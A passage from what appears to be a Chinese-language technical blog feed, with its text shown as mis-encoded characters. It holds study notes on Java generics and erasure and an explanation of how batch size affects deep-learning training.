        <content type="html"><![CDATA[<h2 id="15-2-ç®€å•æ³›å‹"><a href="#15-2-ç®€å•æ³›å‹" class="headerlink" title="15.2 ç®€å•æ³›å‹"></a>15.2 ç®€å•æ³›å‹</h2><p><strong>åœ¨æ²¡æœ‰æ³›å‹ä¹‹å‰ï¼Œé‡‡ç”¨çš„æ˜¯ç»§æ‰¿æœºåˆ¶æ¥å®ç°æ³›å‹ï¼Œä½†æ˜¯éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œä¼šæœ‰é£é™©</strong></p><h3 id="åˆ›å»ºæ³›å‹ç±»ï¼š"><a href="#åˆ›å»ºæ³›å‹ç±»ï¼š" class="headerlink" title="åˆ›å»ºæ³›å‹ç±»ï¼š"></a>åˆ›å»ºæ³›å‹ç±»ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">T ...</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åˆ›å»ºæ³›å‹å¯¹è±¡</span></span><br><span class="line">A&lt;..&gt; a = <span class="keyword">new</span> A&lt;&gt;();</span><br></pre></td></tr></table></figure><hr><h3 id="15-2-1-ä½¿ç”¨æ³›å‹åˆ›å»ºå¤šç»´å…ƒç¥–ï¼Œå®ç°ä¸€æ¬¡è°ƒç”¨è¿”å›å¤šä¸ªå¯¹è±¡"><a href="#15-2-1-ä½¿ç”¨æ³›å‹åˆ›å»ºå¤šç»´å…ƒç¥–ï¼Œå®ç°ä¸€æ¬¡è°ƒç”¨è¿”å›å¤šä¸ªå¯¹è±¡" class="headerlink" title="15.2.1 ä½¿ç”¨æ³›å‹åˆ›å»ºå¤šç»´å…ƒç¥–ï¼Œå®ç°ä¸€æ¬¡è°ƒç”¨è¿”å›å¤šä¸ªå¯¹è±¡"></a>15.2.1 ä½¿ç”¨æ³›å‹åˆ›å»ºå¤šç»´å…ƒç¥–ï¼Œå®ç°ä¸€æ¬¡è°ƒç”¨è¿”å›å¤šä¸ªå¯¹è±¡</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tuple</span>&lt;<span class="title">A</span>,<span class="title">B</span>,<span class="title">C</span>,...&gt;</span>&#123;<span class="comment">//A,B,Cæ˜¯æ³›å‹</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> A first;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> B second; <span class="comment">// ä½¿ç”¨finalä½¿å¾—å®¢æˆ·ç«¯ç¨‹åºå‘˜æ— æ³•ä¿®æ”¹ï¼Œç›¸å½“äºprivate+getsetæ–¹æ³•</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tuple</span><span class="params">(A a,B b)</span></span>&#123;first = a;second = b;&#125; <span class="comment">//æ„é€ å™¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="15-3-æ³›å‹æ¥å£"><a href="#15-3-æ³›å‹æ¥å£" class="headerlink" title="15.3 æ³›å‹æ¥å£"></a>15.3 æ³›å‹æ¥å£</h2><p><strong><code>public interface Generator&lt;T&gt; &#123;T next();&#125;</code></strong></p><h3 id="å®ç°æ¥å£ï¼š"><a href="#å®ç°æ¥å£ï¼š" class="headerlink" title="å®ç°æ¥å£ï¼š"></a>å®ç°æ¥å£ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Generator</span>&lt;<span class="title">Integer</span>&gt;</span>&#123; <span class="comment">//æŒ‡å®šæ³›å‹Tå…·ä½“ç±»å‹ï¼Œå¯ä»¥æ˜¯åŒ…è£…ç±»æ•°æ®ç±»å‹ä¹Ÿå¯ä»¥æ˜¯è‡ªå®šä¹‰ç±»</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Integer <span class="title">next</span><span class="params">()</span></span>&#123; <span class="comment">// é‡å†™æ¥å£ä¸­çš„æ–¹æ³•</span></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="15-4-æ³›å‹æ–¹æ³•"><a href="#15-4-æ³›å‹æ–¹æ³•" class="headerlink" title="15.4 æ³›å‹æ–¹æ³•"></a>15.4 æ³›å‹æ–¹æ³•</h2><h3 id="ä¸ºä»€ä¹ˆè¦ç”¨æ³›å‹æ–¹æ³•ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦ç”¨æ³›å‹æ–¹æ³•ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ç”¨æ³›å‹æ–¹æ³•ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦ç”¨æ³›å‹æ–¹æ³•ï¼Ÿ</h3><ul><li><strong>å› ä¸ºæ³›å‹ç±»è¦åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°±æŒ‡æ˜ç±»å‹ï¼Œå¦‚æœæƒ³æ¢ä¸€ç§ç±»å‹ï¼Œä¸å¾—ä¸é‡æ–°newä¸€æ¬¡ï¼Œå¯èƒ½ä¸å¤Ÿçµæ´»ï¼›è€Œæ³›å‹æ–¹æ³•å¯ä»¥åœ¨è°ƒç”¨çš„æ—¶å€™æŒ‡æ˜ç±»å‹ï¼Œæ›´åŠ çµæ´»</strong></li><li><strong>ä½¿ç”¨æ³›å‹ç±»ï¼Œåˆ›å»ºå¯¹è±¡æ—¶å¿…é¡»æŒ‡å®šæ³›å‹å…·ä½“ç±»å‹ï¼›è€Œä½¿ç”¨æ³›å‹æ–¹æ³•ï¼Œåˆ™ä¸å¿…æŒ‡å®šï¼Œç¼–è¯‘å™¨ä¼šæ ¹æ®å‚æ•°è‡ªåŠ¨åˆ¤æ–­</strong></li></ul><h3 id="æ³›å‹æ–¹æ³•å®šä¹‰"><a href="#æ³›å‹æ–¹æ³•å®šä¹‰" class="headerlink" title="æ³›å‹æ–¹æ³•å®šä¹‰"></a>æ³›å‹æ–¹æ³•å®šä¹‰</h3><p><strong>æ³›å‹å‚æ•°åˆ—è¡¨å¿…é¡»ç½®äºè¿”å›å€¼ä¹‹å‰å‰ï¼Œæ³›å‹æ–¹æ³•çš„ç±»å¯ä»¥æ˜¯æ³›å‹ç±»ä¹Ÿå¯ä»¥ä¸æ˜¯</strong></p><blockquote><ul><li><strong><code>public &lt;T&gt; void f(T x)&#123;...&#125;</code></strong></li><li><strong><code>public &lt;T,E&gt; E f(T a, E b) &#123;...&#125;</code></strong></li><li><strong><code>public  static &lt;T&gt; T f(T a)&#123;&#125;</code>  //æ³›å‹é™æ€æ–¹æ³•å®šä¹‰</strong></li></ul></blockquote><p><strong>æ˜¾å¼æŒ‡å®šç±»å‹è°ƒç”¨æ³›å‹æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(T x)</span></span>&#123;<span class="comment">//æ³›å‹æ–¹æ³•</span></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">staticfun</span><span class="params">(T x)</span></span>&#123; <span class="comment">//é™æ€æ³›å‹æ–¹æ³•</span></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> main&#123;</span><br><span class="line">    A&lt;Integer&gt; a = <span class="keyword">new</span> A&lt;&gt;();</span><br><span class="line">        a.&lt;String&gt;fun(<span class="string">&quot;abc&quot;</span>); <span class="comment">//æŒ‡å®šæ³›å‹å…·ä½“ç±»å‹è°ƒç”¨æ³›å‹æ–¹æ³•</span></span><br><span class="line">        A.&lt;String&gt;staticfun(<span class="string">&quot;abc&quot;</span>); <span class="comment">//æŒ‡å®šæ³›å‹å…·ä½“ç±»å‹è°ƒç”¨é™æ€æ³›å‹æ–¹æ³•</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="15-7-æ“¦é™¤"><a href="#15-7-æ“¦é™¤" class="headerlink" title="15.7 æ“¦é™¤"></a>15.7 æ“¦é™¤</h2><h3 id="ä»€ä¹ˆæ˜¯æ“¦é™¤ï¼š"><a href="#ä»€ä¹ˆæ˜¯æ“¦é™¤ï¼š" class="headerlink" title="ä»€ä¹ˆæ˜¯æ“¦é™¤ï¼š"></a>ä»€ä¹ˆæ˜¯æ“¦é™¤ï¼š</h3><ul><li><p><strong>æ³›å‹å…·ä½“ç±»å‹ä¸åŒæ“¦é™¤åä¼šå˜æˆåŸç”Ÿç±» å¦‚List<String> å’ŒList<Integer>æ˜¯ä¸€ç§ç±»å‹ï¼Œæœ€åéƒ½ä¼šæ“¦é™¤æˆList</strong></p></li><li><p><strong>æ³›å‹åªæ˜¯ç”¨æ¥æ£€æŸ¥ç±»å‹æ­£ç¡®æ€§ï¼Œä¸€æ—¦è¿è¡Œå°±ä¼šè¢«æ“¦é™¤</strong></p><h3 id="æ“¦é™¤çš„ç»“æœï¼š"><a href="#æ“¦é™¤çš„ç»“æœï¼š" class="headerlink" title="æ“¦é™¤çš„ç»“æœï¼š"></a>æ“¦é™¤çš„ç»“æœï¼š</h3></li><li><p><strong><code>List&lt;T&gt;</code>è¢«æ“¦é™¤ä¸º<code>List</code>  ã€  <code>List&lt;String&gt;</code>è¢«æ“¦é™¤ä¸º<code>List&lt;Object&gt;</code></strong></p></li><li><p><strong><code>&lt;T extendsÂ  A&gt;</code>æ“¦é™¤ä¸º<code>&lt;A&gt;</code></strong></p></li></ul><h3 id="ä»€ä¹ˆæ˜¯è¾¹ç•Œï¼š"><a href="#ä»€ä¹ˆæ˜¯è¾¹ç•Œï¼š" class="headerlink" title="ä»€ä¹ˆæ˜¯è¾¹ç•Œï¼š"></a>ä»€ä¹ˆæ˜¯è¾¹ç•Œï¼š</h3><ul><li><strong>è¿è¡Œåæ³›å‹ä¼šè¢«æ“¦é™¤åˆ°ä¸Šè¾¹ç•Œ</strong></li><li><strong><code>class A&lt;T extends B&gt;</code>æ“¦é™¤åˆ°<code>&lt;B&gt;</code></strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>batch_sizeè¯¦è§£</title>
      <link href="/2021/06/16/batch_size%E8%AF%A6%E8%A7%A3_(1)/"/>
      <url>/2021/06/16/batch_size%E8%AF%A6%E8%A7%A3_(1)/</url>
      
        <content type="html"><![CDATA[<h1 id="è°ˆè°ˆæ·±åº¦å­¦ä¹ ä¸­çš„-Batch-Size"><a href="#è°ˆè°ˆæ·±åº¦å­¦ä¹ ä¸­çš„-Batch-Size" class="headerlink" title="è°ˆè°ˆæ·±åº¦å­¦ä¹ ä¸­çš„ Batch_Size"></a><strong>è°ˆè°ˆæ·±åº¦å­¦ä¹ ä¸­çš„ Batch_Size</strong></h1><p>Batch_Sizeï¼ˆæ‰¹å°ºå¯¸ï¼‰æ˜¯æœºå™¨å­¦ä¹ ä¸­ä¸€ä¸ªé‡è¦å‚æ•°ï¼Œæ¶‰åŠè¯¸å¤šçŸ›ç›¾ï¼Œä¸‹é¢é€ä¸€å±•å¼€ã€‚</p><p><strong>é¦–å…ˆï¼Œä¸ºä»€ä¹ˆéœ€è¦æœ‰ Batch_Size è¿™ä¸ªå‚æ•°ï¼Ÿ</strong><br>Batch çš„é€‰æ‹©ï¼Œ<strong>é¦–å…ˆå†³å®šçš„æ˜¯ä¸‹é™çš„æ–¹å‘ã€‚</strong>å¦‚æœæ•°æ®é›†æ¯”è¾ƒå°ï¼Œå®Œå…¨å¯ä»¥é‡‡ç”¨<strong>å…¨æ•°æ®é›†</strong>Â ï¼ˆÂ <strong>Full Batch Learning</strong>Â ï¼‰çš„å½¢å¼ï¼Œè¿™æ ·åšè‡³å°‘æœ‰ 2 ä¸ªå¥½å¤„ï¼šå…¶ä¸€ï¼Œç”±å…¨æ•°æ®é›†ç¡®å®šçš„æ–¹å‘èƒ½å¤Ÿæ›´å¥½åœ°ä»£è¡¨æ ·æœ¬æ€»ä½“ï¼Œä»è€Œæ›´å‡†ç¡®åœ°æœå‘æå€¼æ‰€åœ¨çš„æ–¹å‘ã€‚å…¶äºŒï¼Œç”±äºä¸åŒæƒé‡çš„æ¢¯åº¦å€¼å·®åˆ«å·¨å¤§ï¼Œå› æ­¤é€‰å–ä¸€ä¸ªå…¨å±€çš„å­¦ä¹ ç‡å¾ˆå›°éš¾ã€‚ Full Batch Learning å¯ä»¥ä½¿ç”¨<strong>Rprop</strong>Â åªåŸºäºæ¢¯åº¦ç¬¦å·å¹¶ä¸”é’ˆå¯¹æ€§å•ç‹¬æ›´æ–°å„æƒå€¼ã€‚</p><p>å¯¹äºæ›´å¤§çš„æ•°æ®é›†ï¼Œä»¥ä¸Š 2 ä¸ªå¥½å¤„åˆå˜æˆäº† 2 ä¸ªåå¤„ï¼šå…¶ä¸€ï¼Œéšç€æ•°æ®é›†çš„æµ·é‡å¢é•¿å’Œå†…å­˜é™åˆ¶ï¼Œä¸€æ¬¡æ€§è½½å…¥æ‰€æœ‰çš„æ•°æ®è¿›æ¥å˜å¾—è¶Šæ¥è¶Šä¸å¯è¡Œã€‚å…¶äºŒï¼Œä»¥ Rprop çš„æ–¹å¼è¿­ä»£ï¼Œä¼šç”±äºå„ä¸ª Batch ä¹‹é—´çš„é‡‡æ ·å·®å¼‚æ€§ï¼Œå„æ¬¡æ¢¯åº¦ä¿®æ­£å€¼ç›¸äº’æŠµæ¶ˆï¼Œæ— æ³•ä¿®æ­£ã€‚è¿™æ‰æœ‰äº†åæ¥Â <strong>RMSProp</strong>Â çš„å¦¥åæ–¹æ¡ˆã€‚</p><p><strong>æ—¢ç„¶ Full Batch Learning å¹¶ä¸é€‚ç”¨å¤§æ•°æ®é›†ï¼Œé‚£ä¹ˆèµ°å‘å¦ä¸€ä¸ªæç«¯æ€ä¹ˆæ ·ï¼Ÿ</strong><br>æ‰€è°“å¦ä¸€ä¸ªæç«¯ï¼Œå°±æ˜¯æ¯æ¬¡åªè®­ç»ƒä¸€ä¸ªæ ·æœ¬ï¼Œå³ Batch_Size = 1ã€‚è¿™å°±æ˜¯<strong>åœ¨çº¿å­¦ä¹ ï¼ˆOnline Learningï¼‰</strong>ã€‚çº¿æ€§ç¥ç»å…ƒåœ¨å‡æ–¹è¯¯å·®ä»£ä»·å‡½æ•°çš„é”™è¯¯é¢æ˜¯ä¸€ä¸ªæŠ›ç‰©é¢ï¼Œæ¨ªæˆªé¢æ˜¯æ¤­åœ†ã€‚å¯¹äºå¤šå±‚ç¥ç»å…ƒã€éçº¿æ€§ç½‘ç»œï¼Œåœ¨å±€éƒ¨ä¾ç„¶è¿‘ä¼¼æ˜¯æŠ›ç‰©é¢ã€‚ä½¿ç”¨åœ¨çº¿å­¦ä¹ ï¼Œæ¯æ¬¡ä¿®æ­£æ–¹å‘ä»¥å„è‡ªæ ·æœ¬çš„æ¢¯åº¦æ–¹å‘ä¿®æ­£ï¼Œæ¨ªå†²ç›´æ’å„è‡ªä¸ºæ”¿ï¼Œ<strong>éš¾ä»¥è¾¾åˆ°æ”¶æ•›</strong>ã€‚</p><p><img src="https://z3.ax1x.com/2021/06/16/2LFJ78.jpg"></p><p><strong>å¯ä¸å¯ä»¥é€‰æ‹©ä¸€ä¸ªé€‚ä¸­çš„ Batch_Size å€¼å‘¢ï¼Ÿ</strong><br>å½“ç„¶å¯ä»¥ï¼Œè¿™å°±æ˜¯<strong>æ‰¹æ¢¯åº¦ä¸‹é™æ³•ï¼ˆMini-batches Learningï¼‰</strong>ã€‚å› ä¸ºå¦‚æœæ•°æ®é›†è¶³å¤Ÿå……åˆ†ï¼Œé‚£ä¹ˆç”¨ä¸€åŠï¼ˆç”šè‡³å°‘å¾—å¤šï¼‰çš„æ•°æ®è®­ç»ƒç®—å‡ºæ¥çš„æ¢¯åº¦ä¸ç”¨å…¨éƒ¨æ•°æ®è®­ç»ƒå‡ºæ¥çš„æ¢¯åº¦æ˜¯å‡ ä¹ä¸€æ ·çš„ã€‚</p><p><strong>åœ¨åˆç†èŒƒå›´å†…ï¼Œå¢å¤§ Batch_Size æœ‰ä½•å¥½å¤„ï¼Ÿ</strong></p><ul><li>å†…å­˜åˆ©ç”¨ç‡æé«˜äº†ï¼Œå¤§çŸ©é˜µä¹˜æ³•çš„å¹¶è¡ŒåŒ–æ•ˆç‡æé«˜ã€‚</li><li>è·‘å®Œä¸€æ¬¡ epochï¼ˆå…¨æ•°æ®é›†ï¼‰æ‰€éœ€çš„è¿­ä»£æ¬¡æ•°å‡å°‘ï¼Œå¯¹äºç›¸åŒæ•°æ®é‡çš„å¤„ç†é€Ÿåº¦è¿›ä¸€æ­¥åŠ å¿«ã€‚</li><li>åœ¨ä¸€å®šèŒƒå›´å†…ï¼Œä¸€èˆ¬æ¥è¯´ Batch_Size è¶Šå¤§ï¼Œå…¶ç¡®å®šçš„ä¸‹é™æ–¹å‘è¶Šå‡†ï¼Œå¼•èµ·è®­ç»ƒéœ‡è¡è¶Šå°ã€‚</li></ul><p><strong>ç›²ç›®å¢å¤§ Batch_Size æœ‰ä½•åå¤„ï¼Ÿ</strong></p><ul><li>å†…å­˜åˆ©ç”¨ç‡æé«˜äº†ï¼Œä½†æ˜¯å†…å­˜å®¹é‡å¯èƒ½æ’‘ä¸ä½äº†ã€‚</li><li>è·‘å®Œä¸€æ¬¡ epochï¼ˆå…¨æ•°æ®é›†ï¼‰æ‰€éœ€çš„è¿­ä»£æ¬¡æ•°å‡å°‘ï¼Œè¦æƒ³è¾¾åˆ°ç›¸åŒçš„ç²¾åº¦ï¼Œå…¶æ‰€èŠ±è´¹çš„æ—¶é—´å¤§å¤§å¢åŠ äº†ï¼Œä»è€Œå¯¹å‚æ•°çš„ä¿®æ­£ä¹Ÿå°±æ˜¾å¾—æ›´åŠ ç¼“æ…¢ã€‚</li><li>Batch_Size å¢å¤§åˆ°ä¸€å®šç¨‹åº¦ï¼Œå…¶ç¡®å®šçš„ä¸‹é™æ–¹å‘å·²ç»åŸºæœ¬ä¸å†å˜åŒ–ã€‚</li></ul><p><strong>è°ƒèŠ‚ Batch_Size å¯¹è®­ç»ƒæ•ˆæœå½±å“åˆ°åº•å¦‚ä½•ï¼Ÿ</strong><br>è¿™é‡Œè·‘ä¸€ä¸ª LeNet åœ¨ MNIST æ•°æ®é›†ä¸Šçš„æ•ˆæœã€‚MNIST æ˜¯ä¸€ä¸ªæ‰‹å†™ä½“æ ‡å‡†åº“ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯Â **TheanoÂ **æ¡†æ¶ã€‚è¿™æ˜¯ä¸€ä¸ª Python çš„æ·±åº¦å­¦ä¹ åº“ã€‚<a href="https://link.zhihu.com/?target=http://deeplearning.net/software/theano/install.html%23install">å®‰è£…æ–¹ä¾¿</a>ï¼ˆå‡ è¡Œå‘½ä»¤è€Œå·²ï¼‰ï¼Œè°ƒè¯•ç®€å•ï¼ˆè‡ªå¸¦ Profileï¼‰ï¼ŒGPU / CPU é€šåƒï¼Œ<a href="https://link.zhihu.com/?target=http://deeplearning.net/tutorial/contents.html">å®˜æ–¹æ•™ç¨‹ç›¸å½“å®Œå¤‡</a>ï¼Œæ”¯æŒæ¨¡å—ååˆ†ä¸°å¯Œï¼ˆé™¤äº† CNNsï¼Œæ›´æ˜¯æ”¯æŒ RBM / DBN / LSTM / RBM-RNN / SdA / MLPsï¼‰ã€‚åœ¨å…¶ä¸Šå±‚æœ‰Â <a href="https://link.zhihu.com/?target=http://keras.io/">Keras</a>Â å°è£…ï¼Œæ”¯æŒ GRU / JZS1, JZS2, JZS3 ç­‰è¾ƒæ–°ç»“æ„ï¼Œæ”¯æŒ Adagrad / Adadelta / RMSprop / Adam ç­‰ä¼˜åŒ–ç®—æ³•ã€‚<br>è¿è¡Œç»“æœä¸ä¸Šæ–‡åˆ†æç›¸å°è¯ï¼š</p><ul><li><p>Batch_Size å¤ªå°ï¼Œç®—æ³•åœ¨ 200 epoches å†…ä¸æ”¶æ•›ã€‚</p></li><li><p>éšç€ Batch_Size å¢å¤§ï¼Œå¤„ç†ç›¸åŒæ•°æ®é‡çš„é€Ÿåº¦è¶Šå¿«ã€‚</p></li><li><p>éšç€ Batch_Size å¢å¤§ï¼Œè¾¾åˆ°ç›¸åŒç²¾åº¦æ‰€éœ€è¦çš„ epoch æ•°é‡è¶Šæ¥è¶Šå¤šã€‚</p></li><li><p>ç”±äºä¸Šè¿°ä¸¤ç§å› ç´ çš„çŸ›ç›¾ï¼Œ Batch_Size å¢å¤§åˆ°æŸä¸ªæ—¶å€™ï¼Œè¾¾åˆ°<strong>æ—¶é—´ä¸Š</strong>çš„æœ€ä¼˜ã€‚</p></li><li><p>ç”±äºæœ€ç»ˆæ”¶æ•›ç²¾åº¦ä¼šé™·å…¥ä¸åŒçš„å±€éƒ¨æå€¼ï¼Œå› æ­¤ Batch_Size å¢å¤§åˆ°æŸäº›æ—¶å€™ï¼Œè¾¾åˆ°æœ€ç»ˆæ”¶æ•›<strong>ç²¾åº¦ä¸Š</strong>çš„æœ€ä¼˜ã€‚</p></li></ul><h2 id="batch-size-éœ€è¦è°ƒå‚"><a href="#batch-size-éœ€è¦è°ƒå‚" class="headerlink" title="batch size éœ€è¦è°ƒå‚"></a>batch size éœ€è¦<strong>è°ƒå‚</strong></h2><p>å¯ä»¥ç¡®å®šçš„æ˜¯ï¼Œ<strong>batch size ç»éè¶Šå¤§è¶Šå¥½</strong>ã€‚<br>å› ä¸º batch size çš„æé™æ˜¯è®­ç»ƒé›†æ ·æœ¬æ€»ä¸ªæ•°ï¼Œè€Œè¿™æ˜¯å½“åˆç¥ç»ç½‘ç»œè¿˜æœªå¦‚æ­¤ä¹‹ç«æ—¶çš„è®­ç»ƒæ–¹å¼ Gradient Descent (GD)ã€‚<br>2014 å¹´åˆæˆ‘ä¸Šçš„äººå·¥ç¥ç»ç½‘ç»œ (è¿˜ä¸å«æ·±åº¦å­¦ä¹ ï¼Œéå¸¸æ—§çš„æ•™å­¦ææ–™) è¯¾ç¨‹ï¼Œè€å¸ˆç•™çš„ä½œä¸šå°±æ˜¯ç”¨è‡ªå·±å†™ä¸ªç¥ç»ç½‘ç»œå»å®ç° 4 è¾“å…¥<a href="https://link.zhihu.com/?target=https://wenku.baidu.com/view/bba0bf1090c69ec3d5bb7537.html">å¼‚æˆ–é—¨</a>ã€‚<br><img src="https://z3.ax1x.com/2021/06/16/2LVSD1.jpg"></p><p>ä¸­é—´å±‚çš„ w çš„æ¢¯åº¦æ˜¯çº¯ç²¹ç”¨è§£æå…¬å¼è®¡ç®—è€Œå¾— (ä¸æ˜¯å¦‚ä»Šçš„è®¡ç®—å›¾)ï¼Œæ¿€æ´»å‡½æ•°æ˜¯ sigmoid (ä¸æ˜¯ Relu)ï¼Œè€Œä¸”æ¯æ¬¡æ›´æ–°éƒ½ä½¿ç”¨æ‰€æœ‰çš„ 16 ä¸ªæ ·æœ¬ï¼Œå°±æ˜¯å•çº¯çš„å»å®Œå…¨æ‹Ÿåˆè®­ç»ƒé›†ï¼Œåªæ˜¯ä¸ºäº†æŸ¥çœ‹ç¥ç»ç½‘ç»œæ‹Ÿåˆä»»æ„å‡½æ•°çš„èƒ½åŠ› (è¿™å¾ˆä¸ç°å®ï¼Œå› ä¸ºå¦‚æœçŸ¥é“æ‰€æœ‰æ ·æœ¬ï¼Œå‹æ ¹å°±ä¸éœ€è¦å»å­¦ä¹ ã€‚ç°å®çš„ä»»åŠ¡ï¼Œæ˜¯éœ€è¦ä»æœ‰é™çš„è®­ç»ƒæ ·æœ¬ä¸­è®­ç»ƒå‡ºå¯ä»¥ç”¨äºé¢„æµ‹æµ‹è¯•æ•°æ®çš„æ¨¡å‹)ã€‚<br>ä¸‹é¢æ˜¯æˆ‘å½“æ—¶äº¤ä½œä¸šçš„ loss ä¸‹é™å›¾ã€‚å¯ä»¥çœ‹åˆ° loss å‘ˆé˜¶æ¢¯å¼ä¸‹é™ã€‚å½“æ—¶è¢«è§£è¯»ä¸ºæ˜¯é™·å…¥å±€éƒ¨æœ€å°å€¼ã€‚22000æ¬¡ (æ¨ªåæ ‡) è¿­ä»£æ‰èƒ½å¤Ÿæ‹Ÿåˆ (çºµåæ ‡æ˜¯ loss å¤§å°)ï¼Œç”¨å…¨éƒ¨æ ·æœ¬ä½œä¸º batch size çš„ Gradient Descent (GD) æ•ˆæœæ˜¯å¾ˆå·®çš„ã€‚</p><p>æ·±åº¦å­¦ä¹ å’Œä»¥å‰çš„äººå·¥ç¥ç»ç½‘ç»œå·®åœ¨å“ªé‡Œäº†ï¼Ÿä¸ºä»€ä¹ˆè¿‘å‡ å¹´çªç„¶å˜æˆå„ä¸ªåª’ä½“å¹ä¸Šå¤©çš„ç¥è¯ï¼Ÿäº‹å®ä¸Šæ·±åº¦å­¦ä¹ çš„æ ¸å¿ƒæŠ€æœ¯åœ¨äºŒä¸‰åå¹´å‰å°±æœ‰ï¼Œæ˜¯å„ä¸ªæŠ€æœ¯ç»„åˆæ–¹å¼çš„æ‰é€ æˆäº†ä»Šå¤©çš„å·®å¼‚ (ä¹Ÿå› å¦‚æ­¤ï¼Œåˆšå…¥é—¨çš„ä¼™ä¼´å¾ˆå®¹æ˜“å› æŸä¸ªç»†èŠ‚ä¸åŒç”šè‡³æ— æ³•æ”¶æ•›)ã€‚è¿™å¯ä»¥ä» keras, lasagne ç­‰åº“åŒ…çš„æ–‡æ¡£åˆ†ç±»æ³¨æ„åˆ°<strong>æ·±åº¦å­¦ä¹ çš„è·ƒè¿›æ¥æºäºä¸åŒæŠ€æœ¯çš„ç»„åˆ</strong>ï¼š<strong>å±‚</strong>ã€<strong>æ¢¯åº¦æ›´æ–°æ–¹å¼</strong>ã€<strong>åˆå§‹åŒ–æ–¹å¼</strong>ã€<strong>éçº¿æ€§</strong>ã€<strong>ç›®æ ‡å‡½æ•°</strong>ã€<strong>æ­£è§„é¡¹</strong>ç­‰ã€‚(ç ”ç©¶æ—¶ä¹Ÿä¼šåˆ†åˆ«å»æå‡ä¸åŒçš„æŠ€æœ¯ç»†èŠ‚)<br>ç°åœ¨äººä»¬åˆ†ææ·±åº¦å­¦ä¹ å´›èµ·åŸå› æ—¶äººä»¬å¸¸ä¼šè¯´ï¼šå› ä¸ºå¤§æ•°æ®ã€GPU çš„é«˜å¹¶è¡Œè®¡ç®—èƒ½åŠ›ã€ReLUï¼Œç­‰ç­‰ï¼Œä½†è¿˜æœ‰ä¸€ä¸ªå¸¸è¢«å¿½ç•¥ï¼Œç®€å•å´åˆæ„å¤–å¼ºå¤§çš„å› ç´ å°±æ˜¯ Gradient Descent (GD) æ›¿æ¢æˆäº† Stochastic Gradient Descent (SGD)ã€‚éšååˆæœ‰å¤§æ‰¹çš„å¼¥è¡¥ æœ´ç´ SGD ä¸è¶³çš„æ›´æ–°ç®—æ³•ï¼Œä¹Ÿå°±æ˜¯åœ¨ <strong>æ¢¯åº¦æ›´æ–°æ–¹å¼</strong> è¿™ä¸€ç±»ã€‚å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  <a href="https://link.zhihu.com/?target=http://ruder.io/optimizing-gradient-descent/">An overview of gradient descent optimization algorithms</a>ã€‚</p><ul><li>Gradient Descentï¼šæ‰€æœ‰æ ·æœ¬ç®—å‡ºçš„æ¢¯åº¦çš„å¹³å‡å€¼æ¥æ›´æ–°æ¯ä¸€æ­¥</li><li>Stochastic Gradient Descentï¼šä¸€ä¸ªæ ·æœ¬ç®—å‡ºçš„æ¢¯åº¦æ¥æ›´æ–°æ¯ä¸€æ­¥</li></ul><p>è™½ç„¶ä»<strong>ç›´è§‰ä¸Š</strong>ï¼ŒGradient Descent å¯ä»¥å¿«é€Ÿå‡†ç¡®çš„å°†è®­ç»ƒé›†çš„ loss é™ä½åˆ°æœ€å°ï¼Œä½†å®é™…ä¸Šå¾ˆå®¹æ˜“é™·å…¥å±€éƒ¨æœ€å°å€¼æˆ–éç‚¹ (ä¸çŸ¥é“ä»€ä¹ˆæ˜¯éç‚¹çš„çœ‹ <a href="https://www.zhihu.com/people/02c1927a26f1fa47d3d43ec304b81015">@å¤•å°ç‘¶Elsa</a> çš„ <a 